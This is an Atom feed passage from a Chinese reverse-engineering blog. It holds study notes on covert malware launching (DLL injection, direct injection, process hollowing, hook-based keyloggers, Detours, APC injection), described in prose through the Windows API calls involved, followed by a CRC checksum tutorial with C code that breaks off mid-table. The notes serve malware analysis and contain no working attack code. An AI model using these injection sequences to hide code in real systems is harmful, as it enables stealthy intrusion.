    <published>2018-08-18T02:09:07.280Z</published>
    <updated>2018-09-02T12:36:53.106Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第12章-隐蔽的恶意代码启动"><a href="#第12章-隐蔽的恶意代码启动" class="headerlink" title="第12章  隐蔽的恶意代码启动"></a>第12章  隐蔽的恶意代码启动</h1><h2 id="12x1-启动器（Launcher）"><a href="#12x1-启动器（Launcher）" class="headerlink" title="12x1 启动器（Launcher）"></a>12x1 启动器（Launcher）</h2><p>启动器（也称为加载器）是一种设置自身或其他恶意代码片段以达到即时或将来秘密运行的恶意代码。启动器的目的是安装一些东西，以使恶意行为对用户隐藏。</p><p>启动器经常包含它要加载的恶意代码。最常见的情况是在它的资源节中包含一个可执行文件或者DLL。正常情况下，Windows PE文件格式中的资源节是供可执行程序使用的，但并不应该是可执行程序的组成代码。正常资源节的内容包括图标、图片、菜单以及字符串。启动器通常在资源节存储恶意代码，当启动器运行时，它在运行嵌入的可执行程序或者DLL程序之前，从资源节将恶意代码提取出来。</p><p>恶意代码启动器通常需要以管理员权限运行，或者通过提权拥有这些权限。普通的用户进程不能执行本章讨论的技术。事实上，启动器可能会包含一些提权代码，这提供了识别启动器的另一种方法。</p><h2 id="12x2-进程注入"><a href="#12x2-进程注入" class="headerlink" title="12x2 进程注入"></a>12x2 进程注入</h2><p>隐藏启动的最流行技术是进程注入。顾名思义，这种技术是将代码注入到另外一个正在运行的进程中，而被注入的进程会不知不觉地运行注入的代码。恶意代码编写者试图通过进程注入技术隐藏代码的行为，有时他们也试图使用这种技术绕过基于主机的防火墙和那些针对进程的安全机制。</p><p>VirtualAllocEx函数用来在另外一个进程中分配一块内存空间。WriteProcessMemory函数用来向VirtualAllocEx函数分配的地址空间写数据。</p><h3 id="1-DLL注入"><a href="#1-DLL注入" class="headerlink" title="1. DLL注入"></a>1. DLL注入</h3><p>DLL注入将代码注入到一个远程进程，并让远程进程调用LoadLibrary，从而强制远程进程加载一个DLL程序到它的进程上下文。一旦被感染的进程加载了恶意DLL程序，OS会自动地调用DLLMain函数，DLLMain函数由这个DLL程序的作者编写。这个函数包含的代码拥有与被注入进程访问系统的相同权限。通常情况下，恶意DLL程序除了DLLMain函数之外，拥有很少的内容，并且它所做的任何操作看起来似乎都来自于被感染的进程。</p><p>为了将恶意DLL注入到一个主机进程，启动器恶意代码必须获取受害进程的句柄。最常用的方法是使用Windows API函数CreateToolhelp32Snapshot、Process32First和Process32Next，来查找进程列表中的目标进程。一旦发现目标进程，启动器会提取目标进程的进程标识（PID），然后用提取的PID调用OpenProcess，以获取目标进程的句柄。</p><p>DLL注入使用CreateRemoteThread函数，这个函数可以让启动器恶意代码在远程进程中创建并运行一个新的线程。使用CreateRemoteThread时，需要传入三个比较重要的参数：OpenProcess函数获得的进程句柄（hProcess），注入线程的入口点（lpStartAddress）以及线程的参数（hpParameter）。例如，线程的入口点可能被设置为Loadlibrary函数的地址，并且恶意DLL名字作为它的参数。这会触发受害进程用恶意DLL名字作为参数调用LoadLibrary，因此恶意DLL就可以加载到受害进程中（假设LoadLibrary函数在受害进程的内存空间中有效，并且恶意DLL的名字字符串存在于同一个进程空间）。</p><p>恶意代码编写者通常使用函数VirtualAllocEx，为恶意动态库的名字字符串创建内存空间。如果提供远程进程的句柄，VirtualAllocEx函数将在远程进程中分配内存空间。</p><p>调用CreateRemoteThread之前，调用的最后一个函数是WriteProcessMemory。这个函数将恶意DLL程序的名字字符串写入到VirtualAllocEx分配的内存空间中。</p><h3 id="2-直接注入"><a href="#2-直接注入" class="headerlink" title="2. 直接注入"></a>2. 直接注入</h3><p>同DLL注入一样，直接注入也涉及在远程进程的内存空间中分配和插入代码。直接注入同DLL注入类似，它们都使用了许多相同的WindowsAPI函数。不同的是，它并不用单独编写一个DLL并且强制远程进程载入它，而是直接将恶意代码注入到远程进程中。</p><p>直接注入比DLL注入更加灵活，但是要想注入的代码在不对宿主进程产生副作用的前提下成功运行，直接注入需要大量的定制代码。这种技术可以被用来注入编译过的代码，但更多的时候，它用来注入shellcode.</p><p>直接注入比DLL注入更加灵活，但是要想注入的代码在不对宿主进程产生副作用的前提下成功运行，直接注入需要大量的定制代码。这种技术可以被用来注入编译过的代码，但更多的时候，它用来注入shellcode.</p><p>在应用直接注入技术的恶意代码中，经常会发现如下三个函数：VirtualAllocEx、writeProcessMenory和CreateRemoteThread。通常会有两次virtualAllocEx和WriteProcessMemory调用。第一次调用是分配内存空间并写入远程线程使用的数据。第二次调用分配内存空间并且写入远程线程代码。CreateRemoteThread调用包含远程线程代码的位置（lpStartAddress）和数据（lpParameter）。</p><p>由于远程线程使用的数据和函数都必须位于受害进程空间内，所以正常编译的程序都无法工作。例如，字符串不在正常的.data段中，需要调用函数LoadLibrary/GetProcAddress来访问未载入的函数。另外，还有一些其他的限制，但我们在这里不做深入探究。基本上，直接注入技术要求恶意代码编写者或者精通汇编语言代码，或者是仅仅注入相对简单的shellcode。</p><p>要分析远程线程的代码，你可能需要调试恶意代码，并且在反汇编器中，转储WriteprocessMemory调用发生前所有的内存缓存区，以便进行分析。由于这些缓存区经常包含shellcode，因此你需要掌握shellcode分析技巧.</p><h2 id="12x3-进程替换"><a href="#12x3-进程替换" class="headerlink" title="12x3 进程替换"></a>12x3 进程替换</h2><p>除了注入代码到一个宿主程序外，一些恶意代码还会使用一种被称为进程替换方法，将一个可执行文件重写到一个运行进程的内存空间。当恶意代码编写者想要将恶意代码伪装成一个合法进程，并且不会产生DLL注入让进程崩溃的危险时，他们会使用进程替换技术。</p><p>这种技术让恶意代码与被替换进程拥有相同的特权级。例如，如果一段恶意代码执行了一次针对进程svchost.exe的进程替换攻击，用户会看到一个名为svchost.exe的进程从C:Windows\System32目录中启动，并很可能认为它没有什么风险（这是一种常见的恶意代码攻击方式）。</p><p>进程替换的关键是以挂起状态创建一个进程。这也就意味着这个进程将会被载入内存，但是它的主线程被挂起。在外部的程序恢复主线程之前，这个程序将不做任何事情，恢复主线程后，才开始执行。</p><p>一旦进程被创建，接下来就要用恶意的可执行文件替换受害进程的内存空间，通常会使用函数ZwUnmapViewofSection来释放由参数指向的所有内存。解除内存映射之后，加载器通常执行函数VirtualAllocEx为恶意代码分配新的内存，并且用函数WriteProcessMemory将恶意代码的每个段写入到受害进程的内存空间，这些操作常在一个循环中进行。</p><p>最后一步，恶意代码恢复受害进程的环境，通过调用SetThreadContext函数，让入口点指向恶意的代码，让其获得运行。最后，调用ResumeThread函数，初始化恶意代码并进行执行，而此时它已经替换了受害进程。</p><p>进程替换是恶意代码伪装成非恶意程序的一种有效方法。通过伪装成受害进程，恶意代码可以绕过防火墙和入侵防御系统（IPS），并且使它看起来像正常的Windows进程，从而让它逃避探测。</p><p>此外，通过使用原始的二进制路径，恶意代码还可以欺骗精明的用户，当查看进程列表时，他们只能看到执行是已知、有效的二进制程序，而并不会意识到它已经被解除了映射，并被替换成了恶意程序。</p><h2 id="12x4-钩子-Hook-注入"><a href="#12x4-钩子-Hook-注入" class="headerlink" title="12x4 钩子(Hook)注入"></a>12x4 钩子(Hook)注入</h2><p>钩子注入是一种利用Windows钩子（Hook）加载恶意代码的方法，恶意代码用它拦截发往某个应用程序的消息。恶意代码编写者可以用挂钩注入，来完成以下两种事情。</p><ol><li>保证无论何时拦截到一个特殊消息，恶意代码都会被运行。</li><li>保证一个特殊的DLL被载入到受害进程的内存空间。</li></ol><h3 id="1-本地和远程钩子（Hook）"><a href="#1-本地和远程钩子（Hook）" class="headerlink" title="1. 本地和远程钩子（Hook）"></a>1. 本地和远程钩子（Hook）</h3><p>有两种类型的Windows钩子：</p><ol><li>本地钩子被用来观察和操纵发往进程内部的消息。</li><li>远程钩子被用来观察和操纵发往一个远程进程的消息（系统中的另一个进程）。</li></ol><p>远程钩子有两种形式：上层和底层。上层的远程挂钩要求钩子例程是DLL程序的一个导出函数。它被操作系统映射到被挂钩线程或者系统所有线程的进程地址空间。底层远程钩子则要求钩子例程被保护在安装钩子的进程中。这个例程在操作系统获得处理事件的机会前被通知。</p><h3 id="2-使用钩子的击键记录器"><a href="#2-使用钩子的击键记录器" class="headerlink" title="2. 使用钩子的击键记录器"></a>2. 使用钩子的击键记录器</h3><p>钩子注入常被一种叫做击键记录器的恶意程序所使用，被用来记录击键。击键可以分别使用WH_KEYBOARD和WH_KEYBOARD_LL钩子例程类型，来注册上层和底层的钩子。</p><p>对于WH_KEYBOARD例程，钩子通常运行在远程进程的上下文空间中，也可以运行在安装钩子的进程空间中。对于WH_KEYBOARD_LL例程，事件直接发送到安装钩子的进程，所以钩子运行在创建钩子的进程中。无论使用哪种钩子类型，击键记录器都可以截获击键，并且在传递到进程或者系统之前，把它们记录到文件或是修改。</p><h3 id="3-使用SetWindowsHookEx"><a href="#3-使用SetWindowsHookEx" class="headerlink" title="3. 使用SetWindowsHookEx"></a>3. 使用SetWindowsHookEx</h3><p>用来执行远程Windows挂钩的主要函数是SetwindowsHookEx，它拥有如下参数：</p><ol><li>idHook 指定要安装的钩子例程的类型。</li><li>lpfn钩子例程指针。</li><li>hMod对于上层的钩子，它来标识包含lpfn定义的钩子例程的DLL句柄。对于底层钩子，它来标识包含1pfn例程的本地模块句柄。</li><li>dwThreadId 指定与钩子例程关联的线程标识，如果这个参数为0，则挂钩例程将绑定与调用线程同在一个桌面的所有线程。当为底层钩子时必须被设置为0。</li></ol><p>钩子例程可以包含处理消息（当它们从系统产生后）的代码，也可以什么也不做。无论如何，钩子例程都必须调用CallNextHookEx，这可以保证调用链中下一个钩子例程能够得到消息，并且保证系统继续正常运行。</p><h3 id="4-目标线程"><a href="#4-目标线程" class="headerlink" title="4. 目标线程"></a>4. 目标线程</h3><p>当制定dwThreadId时，恶意代码通常决定载入到dw某个系统线程，或者载入到所有线程。也就是说，仅当它是击键记录器或者类似的程序时，恶意代码才载入到所有线程（目的是拦截消息）。然而，载入到所有的线程会降低系统的运行速度，并且可能触发入侵防护系统。因此，如果是简单载入一个DLL到远程进程，则注入单个线程会保持恶意代码的隐蔽性。</p><p>指定单线程为目标，要求查找进程列表中的目标进程，如果碰到目标进程没有运行，恶意代码要先启动它。如果一个恶意的应用程序挂钩了一个经常使用的Windows消息，它很有可能会触发入侵防御系统，所以恶意代码通常会挂钩一个不常使用的消息，如WH_CBT（一个用于计算机训练的消息）。</p><h2 id="12x5-Detours"><a href="#12x5-Detours" class="headerlink" title="12x5 Detours"></a>12x5 Detours</h2><p>Detours是微软研究院1999年开发的一个代码库。它的初衷是作为一个来扩展已有操作系统和应用程序功能的简单工具。Detours开发库让开发人员对二进制应用程序进行修改变得简单可行。</p><p>同样，恶意代码编写者也喜欢Detours库，他们使用Detours库执行对导入表的修改，挂载DLL到已有程序文件，并且向运行的进程添加函数钩子等。</p><p>恶意代码编写者最常使用Detours库，来添加一个新的DLL到硬盘上的二进制文件。恶意代码修改PE结构，并且创建一个名为.detour的段，它通常位于导出表和调试符号之间。.detour段在新的导入地址表中包含了原始的PE头部。使用Detours库提供的setdll工具，恶意代码编写者修改PE头部，使其指向新的导入表。</p><h2 id="12x6-APC注入"><a href="#12x6-APC注入" class="headerlink" title="12x6 APC注入"></a>12x6 APC注入</h2><p>在本章的前面，我们看到通过CreateRemoteThread函数创建一个线程就可以使用远程进程中的一个函数。然而，线程创建需要系统开销，所以调用一个现有的线程会更加高效。Windows的异步过程调用（APC）可以满足这种要求。</p><p>APC可以让一个线程在它正常的执行路径运行之前执行一些其他的代码。每一个线程都有一个附加的APC队列，它们在线程处于可警告的等待状态时被处理。例如它们调用如WaitForSingleObjectEx、waitForMultipleobjectsEx和SleepEx函数等。实质上，这些函数给了线程一个处理等待APC的机会。</p><p>如果应用程序在线程可警告等待状态时（未运行之前）排入一个APC队列，那么线程将从调用APC函数开始。线程逐个调用APC队列中的所有APC。当APC队列完成时，线程才继续沿着它规定的路径执行。恶意代码编写者为了让他们的代码立即获得执行，他们用APC抢占可警告等待状态的线程。</p><p>APC有两种存在形式：</p><ol><li>为系统或者驱动生成的APC，被称为内核模式APC。</li><li>为应用程序生成的APC，被称为用户模式APC。<br>恶意代码可以使用APC注入技术，让内核空间或者用户空间中生成用户模式的APC.</li></ol><h3 id="1-用户模式下APC注入"><a href="#1-用户模式下APC注入" class="headerlink" title="1. 用户模式下APC注入"></a>1. 用户模式下APC注入</h3><p>线程可以使用API函数QueueUserAPC排入一个让远程线程调用的函数。运行用户模式的APC要求线程必须处于可警告等待状态，因此恶意代码会查看进程中是否有可能进入这个状态的目标线程。幸运的是，对恶意代码分析师来说，WaitForSingleObjectEx是最常使用的Windows API调用，并且有很多处于可警告等待状态的线程。</p><p>让我们来检查一下QueueUserAPC的参数：pfnAPC、hThread以及dwData。QueueUserAPC要求句柄为hThread的线程使用参数dwData运行pfnAPC定义的函数。</p><blockquote><p>注意：分析过程中，你可以通过查找恶意代码查询目标进程的API调用，如Create Toolhelp32Snapshot、Process32First和Process32Next 来发现目标线程的代码。在这些代码之后的经常是Thread32First和Thread32Next调用，它们通常被包含在一个在目标进程中查找目标线程的循环中。另外，恶意代码也会利用参数SYSTEM_PROCESS_INFORMATION调用Nt/ZwQuerySystemlnformation来发现目标进程。</p></blockquote><h3 id="2-内核模式的APC注入"><a href="#2-内核模式的APC注入" class="headerlink" title="2. 内核模式的APC注入"></a>2. 内核模式的APC注入</h3><p>恶意代码驱动和Rootkit也常常希望在用户空间中执行代码，但是对它们来说这样做并不容易。一种方法是在内核空间执行APC注入。恶意的驱动可创建一个APC，然后分配用户模式进程中的一个线程（最常见的是suchost.exe）运行它。这种类型APC通常由shellcode组成。</p><p>设备驱动利用两个主要的函数来使用APC: KeInitializeApc和KeInsertQueueApc.</p><p>From <a href="https://kabeor.github.io/第12章  隐蔽的恶意代码启动/">https://kabeor.github.io/第12章  隐蔽的恶意代码启动/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第12章-隐蔽的恶意代码启动&quot;&gt;&lt;a href=&quot;#第12章-隐蔽的恶意代码启动&quot; class=&quot;headerlink&quot; title=&quot;第12章  隐蔽的恶意代码启动&quot;&gt;&lt;/a&gt;第12章  隐蔽的恶意代码启动&lt;/h1&gt;&lt;h2 id=&quot;12x1-启动器（Launch
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第四篇 恶意代码功能篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E7%AF%87-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%8A%9F%E8%83%BD%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CRC校验算法及逆向方法初探</title>
    <link href="https://kabeor.github.io/CRC%E6%A0%A1%E9%AA%8C%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/"/>
    <id>https://kabeor.github.io/CRC校验算法及逆向方法初探/</id>
    <published>2018-08-16T07:13:30.658Z</published>
    <updated>2018-08-17T07:13:31.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRC校验算法及逆向方法初探"><a href="#CRC校验算法及逆向方法初探" class="headerlink" title="CRC校验算法及逆向方法初探"></a>CRC校验算法及逆向方法初探</h1><h2 id="循环冗余校验（Cyclic-redundancy-check）介绍"><a href="#循环冗余校验（Cyclic-redundancy-check）介绍" class="headerlink" title="循环冗余校验（Cyclic redundancy check）介绍"></a>循环冗余校验（Cyclic redundancy check）介绍</h2><blockquote><p>循环冗余校验（英语：Cyclic redundancy check，通称“CRC”）是一种根据网络数据包或计算机文件等数据产生简短固定位数校验码的一种散列函数，主要用来检测或校验数据传输或者保存后可能出现的错误。生成的数字在传输或者存储之前计算出来并且附加到数据后面，然后接收方进行检验确定数据是否发生变化。   –维基百科(<a href="https://zh.wikipedia.org/wiki/%E5%BE%AA%E7%92%B0%E5%86%97%E9%A4%98%E6%A0%A1%E9%A9%97" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E5%BE%AA%E7%92%B0%E5%86%97%E9%A4%98%E6%A0%A1%E9%A9%97</a>)</p></blockquote><h2 id="CRC校验计算步骤"><a href="#CRC校验计算步骤" class="headerlink" title="CRC校验计算步骤"></a><strong>CRC校验计算步骤</strong></h2><ol><li>选择一个生成多项式G(x)。</li><li>假设该生成多项式G(x)的二进制数有k位，在发送的数据帧B(x)(设为m位)后加k-1个0，得到新二进制串H(x)，H(x)位数应该为m+k-1。</li><li>H(x)“模2除法”除以G(x)，所得到的余数(记为F(x))就是原数据帧的CRC校验码，又称FCS(帧校验序列)。注意，F(x)的位数只能比G(x)少一位，0不能省略。</li><li>将F(x)附加到B(x)后面，组成新帧N(x),然后发送到接收端。</li><li>接收端将N(x)以“模2除法”除以G(x)，如果没有余数，则表明没有出错(因为在发送端发送数据帧之前就已附加了一个数,做了去余处理(也就已经能整除了),所以结果应该没有余数。如果有余数,则表明该帧在传输过程中出现了差错)。</li></ol><p>来看一些关键点</p><blockquote><ol><li><strong>生成多项式</strong></li></ol></blockquote><p>当进行CRC检验时，发送方与接收方需要事先约定一个除数，即生成多项式，一般记作G(x)。生成多项式的最高位与最低位必须是1。</p><p>常见CRC标准如下</p><p><img src="https://i.loli.net/2018/08/16/5b751c8007704.jpg" alt=""></p><p>逆向中常见的是<br>CRC16  ：<img src="https://i.loli.net/2018/08/16/5b751d408104c.jpg" alt=""><br>CRC32  ：<img src="https://i.loli.net/2018/08/16/5b751d71c13bd.jpg" alt=""></p><p>生成多项式中幂代表在二进制串中该位为1，注意1是x的0次方，二进制串第一位的幂是0</p><p>因此CRC16的二进制串转换为HEX为 <code>0x1 1021</code> ，<br>CRC32 HEX为 <code>0x1 04C11DB7</code>(另一个CRC32:     <code>1 1110 1101 1011 1000 1000 0011 0010 0000 = 0x1 EDB8 8320</code>)。<strong>计算CRC X，就取后X位，如CRC16取后16位，则0x1 1021变为0x1021</strong>。</p><p>这些数值也可以在逆向过程中作为特征，让我们快速识别算法，至于魔改大多数也是从这些数值下手，后面会详细说。</p><blockquote><ol><li><strong>模2除法</strong></li></ol></blockquote><p>模2除法与算术除法类似,但它既不向上位借位也不比较除数和被除数的相同位数值的大小,只以相同位数进行相除。</p><p>模2加法运算为:1+1=0,0+1=1,0+0=0,无进位,也无借位。<br>模2减法运算为:1-1=0,0-1=1,1-0=1,0-0=0,也无进位,无借位。</p><p><img src="https://i.loli.net/2018/08/16/5b7580db445d3.jpg" alt=""></p><blockquote><p>过程图示</p></blockquote><p><img src="https://i.loli.net/2018/08/16/5b758077e370f.jpg" alt=""></p><h2 id="CRC16校验C-实现"><a href="#CRC16校验C-实现" class="headerlink" title="CRC16校验C++实现"></a>CRC16校验C++实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int crc = &apos;a&apos;;//计算字符a的crc16校验码</span><br><span class="line">    //右移8位，和手动计算一样，左移相当于补0，这里相当于直接补了8个0，开始计算。</span><br><span class="line">    crc &lt;&lt;= 8; //&lt;&lt;= 相当余 crc=crc&lt;&lt;8;</span><br><span class="line">    //计算8次。</span><br><span class="line">    for (int i = 0; i &lt; 8; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        //如果最高位是1的话需要计算，如果不是直接左移。（左移的操作可以想象成补0)</span><br><span class="line">        if ((crc &amp; 0x8000) != 0)</span><br><span class="line">        &#123;</span><br><span class="line">            crc &lt;&lt;= 1;</span><br><span class="line">            crc = crc ^ 0x1021;//这个说明用的是 CRC16   x16+x12+x5+1.</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            crc &lt;&lt;= 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //取后16位，如果用的是crc使用的是unsigned short 就不需要这一步了。</span><br><span class="line">    crc = crc &amp; 0xffff;</span><br><span class="line">    //输出。</span><br><span class="line">    std::cout &lt;&lt; crc &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CRC32生成表算法C实现"><a href="#CRC32生成表算法C实现" class="headerlink" title="CRC32生成表算法C实现"></a>CRC32生成表算法C实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">static uint32_t table[256];</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//位逆转</span><br><span class="line">static uint32_t bitrev(uint32_t input, int bw)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    uint32_t var;</span><br><span class="line">    var = 0;</span><br><span class="line">    for(i=0; i&lt;bw; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(input &amp; 0x01)</span><br><span class="line">        &#123;</span><br><span class="line">            var |= 1&lt;&lt;(bw - 1 - i);</span><br><span class="line">        &#125;</span><br><span class="line">        input &gt;&gt;= 1;</span><br><span class="line">    &#125;</span><br><span class="line">    return var;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//码表生成</span><br><span class="line">void crc32_init(uint32_t poly)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int j;</span><br><span class="line">    uint32_t c;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    poly = bitrev(poly, 32);</span><br><span class="line">    for(i=0; i&lt;256; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        c = i;</span><br><span class="line">        for (j=0; j&lt;8; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            c = (c &amp; 1) ? (poly ^ (c &gt;&gt; 1)) : (c &gt;&gt; 1);</span><br><span class="line">        &#125;</span><br><span class="line">        table[i] = c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//计算CRC</span><br><span class="line">uint32_t crc32(uint32_t crc, void* input, int len)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    uint8_t index;</span><br><span class="line">    uint8_t *p;</span><br><span class="line">    p = (uint8_t*)input;</span><br><span class="line">    for(i=0; i&lt;len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        index = (*p ^ crc);</span><br><span class="line">        crc = (crc &gt;&gt; 8) ^ table[index];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    return crc;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//测试用例</span><br><span class="line">void main(void)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t crc;</span><br><span class="line">    crc32_init(0x4C11DB7);</span><br><span class="line">    crc = crc32(0xFFFFFFFF, &quot;1234567890&quot;, 10);</span><br><span class="line">    printf(&quot;CRC32 = 0x%08X\n&quot;, crc ^ 0xFFFFFFFF);</span><br><span class="line">    system(&quot;pause&quot;);</span><br></pre></td></tr></table></figure><h2 id="CRC查表法"><a href="#CRC查表法" class="headerlink" title="CRC查表法"></a>CRC查表法</h2><p>查表法是将移位异或的计算结果做成了一个表，就是将0~256放入一个长度为16位的寄存器中的低八位，高八位填充0，然后将该寄存器与生成多项式按照把CRC寄存器的内容右移一位（朝低位）用0填补最高位，并检查右移后的移出位；如果移出位为0：再次右移一位；如果移出位为1，CRC寄存器与多项式进行异或，直到八位全部移出，最后寄存器中的值就是表格中的数据，高八位、低八位分别单独一个表。</p><p>CRC32数据表生成<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int make_crc32_table()  </span><br><span class="line">&#123;  </span><br><span class="line">    unsigned c;  </span><br><span class="line">    int i = 0;  </span><br><span class="line">    int bit = 0;  </span><br><span class="line">    for(i = 0; i &lt; 256; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        c  = (unsigned)i;      </span><br><span class="line">        for(bit = 0; bit &lt; 8; bit++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            if(c&amp;1)  </span><br><span class="line">            &#123;  </span><br><span class="line">                c = (c &gt;&gt; 1)^(0xEDB88320);  //生成多项式，如果动态生成这张CRC32表，则必定会有这个数</span><br><span class="line">                 </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123;  </span><br><span class="line">                c =  c &gt;&gt; 1;  </span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;  </span><br><span class="line">        crc32_table = c; </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;  //这个算法，会产生包含有256个元素的CRC32表</span><br></pre></td></tr></table></figure></p><p>逆向时若是动态生成表，则应留意生成多项式，若是静态表，则会在数据段留下整个表</p><p>常用表如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CRC-16 Table</span><br><span class="line"></span><br><span class="line">  00h   0000 C0C1 C181 0140 C301 03C0 0280 C241</span><br><span class="line">  08h   C601 06C0 0780 C741 0500 C5C1 C481 0440</span><br><span class="line">  10h   CC01 0CC0 0D80 CD41 0F00 CFC1 CE81 0E40</span><br><span class="line">  18h   0A00 CAC1 CB81 0B40 C901 09C0 0880 C841</span><br><span class="line"></span><br><span class="line">  20h   D801 18C0 1980 D941 1B00 DBC1 DA81 1A40</span><br><span class="line">  28h   1E00 DEC1 DF81 1F40 DD01 1DC0 1C80 DC41</span><br><span class="line">  30h   1400 D4C1 D581 1540 D701 17C0 1680 D641</span><br><span class="line">  38h   D201 12C0 1380 D341 1100 D1C1 D081 1040</span><br><span class="line"></span><br><span class="line">  40h   F001 30C0 3180 F141 3300 F3C1 F281 3240</span><br><span class="line">  48h   3600 F6C1 F781 3740 F501 35C0 3480 F441</span><br><span class="line">  50h   3C00 FCC1 FD81 3D40 FF01 3FC0 3E80 FE41</span><br><span class="line">  58h   FA01 3AC0 3B80 FB41 3900 F9C1 F881 3840</span><br><span class="line"></span><br><span class="line">  60h   2800 E8C1 E981 2940 EB01 2BC0 2A80 EA41</span><br><span class="line">  68h   EE01 2EC0 2F80 EF41 2D00 EDC1 EC81 2C40</span><br><span class="line">  70h   E401 24C0 2580 E541 2700 E7C1 E681 2640</span><br><span class="line">  78h   2200 E2C1 E381 2340 E101 21C0 2080 E041</span><br><span class="line"></span><br><span class="line">  80h   A001 60C0 6180 A141 6300 A3C1 A281 6240</span><br><span class="line">  88h   6600 A6C1 A781 6740 A501 65C0 6480 A441</span><br><span class="line">  90h   6C00 ACC1 AD81 6D40 AF01 6FC0 6E80 AE41</span><br><span class="line">  98h   AA01 6AC0 6B80 AB41 6900 A9C1 A881 6840</span><br><span class="line"></span><br><span class="line">  A0h   7800 B8C1 B981 7940 BB01 7BC0 7A80 BA41</span><br><span class="line">  A8h   BE01 7EC0 7F80 BF41 7D00 BDC1 BC81 7C40</span><br><span class="line">  B0h   B401 74C0 7580 B541 7700 B7C1 B681 7640</span><br><span class="line">  B8h   7200 B2C1 B381 7340 B101 71C0 7080 B041</span><br><span class="line"></span><br><span class="line">  C0h   5000 90C1 9181 5140 9301 53C0 5280 9241</span><br><span class="line">  C8h   9601 56C0 5780 9741 5500 95C1 9481 5440</span><br><span class="line">  D0h   9C01 5CC0 5D80 9D41 5F00 9FC1 9E81 5E40</span><br><span class="line">  D8h   5A00 9AC1 9B81 5B40 9901 59C0 5880 9841</span><br><span class="line"></span><br><span class="line">  E0h   8801 48C0 4980 8941 4B00 8BC1 8A81 4A40</span><br><span class="line">  E8h   4E00 8EC1 8F81 4F40 8D01 4DC0 4C80 8C41</span><br><span class="line">  F0h   4400 84C1 8581 4540 8701 47C0 4680 8641</span><br><span class="line">  F8h   8201 42C0 4380 8341 4100 81C1 8081 4040</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CRC-32 Table</span><br><span class="line"></span><br><span class="line">  00h   00000000 77073096 EE0E612C 990951BA</span><br><span class="line">  04h   076DC419 706AF48F E963A535 9E6495A3</span><br><span class="line">  08h   0EDB8832 79DCB8A4 E0D5E91E 97D2D988</span><br><span class="line">  0Ch   09B64C2B 7EB17CBD E7B82D07 90BF1D91</span><br><span class="line"></span><br><span class="line">  10h   1DB71064 6AB020F2 F3B97148 84BE41DE</span><br><span class="line">  14h   1ADAD47D 6DDDE4EB F4D4B551 83D385C7</span><br><span class="line">  18h   136C9856 646BA8C0 FD62F97A 8A65C9EC</span><br><span class="line">  1Ch   14015C4F 63066CD9 FA0F3D63 8D080DF5</span><br><span class="line"></span><br><span class="line">  20h   3B6E20C8 4C69105E D56041E4 A2677172</span><br><span class="line">  24h   3C03E4D1 4B04D447 D20D85FD A50AB56B</span><br><span class="line">  28h   35B5A8FA 42B2986C DBBBC9D6 ACBCF940</span><br><span class="line">  2Ch   32D86CE3 45DF5C75 DCD60DCF ABD13D59</span><br><span class="line"></span><br><span class="line">  30h   26D930AC 51DE003A C8D75180 BFD06116</span><br><span class="line">  